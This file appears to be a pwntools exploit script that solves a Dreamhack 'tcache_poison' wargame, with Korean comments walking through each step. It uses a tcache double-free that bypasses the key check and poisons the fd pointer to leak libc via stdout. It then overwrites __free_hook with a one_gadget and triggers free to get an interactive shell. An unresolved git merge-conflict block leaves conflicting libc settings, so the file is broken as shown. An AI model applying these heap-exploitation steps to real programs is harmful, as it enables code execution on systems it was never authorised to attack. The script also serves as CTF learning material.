from pwn import *


def slog(name, addr):
    return success(": ".join([name, hex(addr)]))


#context.log_level = "debug"

# Local
LOCAL = True
if LOCAL:
    p = process("./tcache_poison")
    libc = ELF("./libc_test/libc6-amd64_2.15-0ubuntu10.23_i386.so")
    #p = process("./tcache_poison", env={'LD_PRELOAD': "./libc-2.27.so"})
else:
    PORT = int(input("Port: "))
    HOST = int(input("Host: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)
    libc = ELF("./libc-2.27.so")


def alloc(size, data):
    p.sendlineafter("Edit\n", b"1")
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)


def free():
    p.sendlineafter("Edit\n", b"2")


def print_chunk():
    p.sendlineafter("Edit\n", b"3")


def edit(data):
    p.sendlineafter("Edit\n", b"4")
    p.sendafter(":", data)


elf = ELF("./tcache_poison")
<<<<<<< HEAD
=======
libc = ELF("./libc-2.27.so")
# libc-2.29 이상의 버전에서는 tcache에 크기별 tcache당 fd를 기록하는 entries 이외에도,
# 크기별 tcache당 몇 번이나 free되어 들어왔는지를 세는 counts도 있으므로
# 해당 버전에서는 counts도 바꿔줘야 한다.
# 여기서는 entries가 중점이니 링크할 때 쓰는 libc를 2.27로 설정하여 쓰자.
>>>>>>> 42989e3adce5b783dc71f9915c486ca15e9df1d6

# [1] malloc 1회 생성
alloc(0x30, b"dreamhack")
free()
# malloc 할당된 청크의 주소 = X라고 할 때
# 현재 tcache: X

# [2] fd: AAAAAAAA, key 부분에 \x00 추가함으로써 DFB 우회
# 이후 tcache에 동일한 chunk 들어감
edit(b"A" * 0x8 + b"\x00")
free()
# 동일한 청크가 2번이나 tcache에 중복으로 들어간다. (tcache duplication)
# 현재 tcache: X <-> X (재귀)

# [3] stdout
addr_stdout = elf.symbols["stdout"]
alloc(0x30, p64(addr_stdout))
# X'의 data 영역에 addr_stdout이 쓰이게 되고
# 이는 곧 X의 fd가 되고, tcache에는 다음에 할당되어야 할 chunk의 주소로써 들어가게 된다.
# 현재 tcache: (1) X -> (2) (stdout -> __IO_2_1_stdout_)

gdb.attach(p)

# [4] fd에 stdout을 넣어 그 다음인 _IO_2_1_stdout_으로 연결
# libc-2.27.so에서 stdout의 하위 3바이트는 760
alloc(0x30, b"B" * 0x8)
# tcache: (stdout -> __IO_2_1_stdout_)
if LOCAL == True:
    alloc(0x30, b"\x60")
else:
    alloc(0x30, b"\x60")
# tcache에 있던 stdout에 할당
# stdout은 중요한 환경변수이므로 값이 변경되면 안 된다.

# [5] libc_base & one_gadget
print_chunk()
p.recvuntil("Content: ")
stdout = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(stdout))
print(hex(libc.symbols["_IO_2_1_stdout_"]))
print(hex(libc.symbols["stdout"]))
print(hex(libc.symbols["__free_hook"]))
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
free_hook = libc_base + libc.symbols["__free_hook"]
if LOCAL == True:
    one_gadget = libc_base + 0xe3afe
else:
    one_gadget = libc_base + 0x4f432

slog("libc_base", libc_base)
slog("free_hook", free_hook)
slog("one_gadget", one_gadget)

# [6] Overwrite free hook with one gadget
alloc(0x40, b"dreamhack")
free()
# tcache: Y
# fd: 0x00
edit(b"C" * 8 + b"\x00")
free()
# tcache: Y <-> Y
# fd: Y
alloc(0x40, p64(free_hook))
# tcache: (1) Y -> (2) free_hook(Y가 빠지고 재귀적으로 가리키던 곳에 free_hook이 들어옴)
alloc(0x40, b"D"*8)
# tcache: free_hook
alloc(0x40, p64(one_gadget))
# tcache에 있던 free_hook 부분에 할당이 되면서 one_gadget이 쓰임


# [7] Call system with free hook
free()

p.interactive()
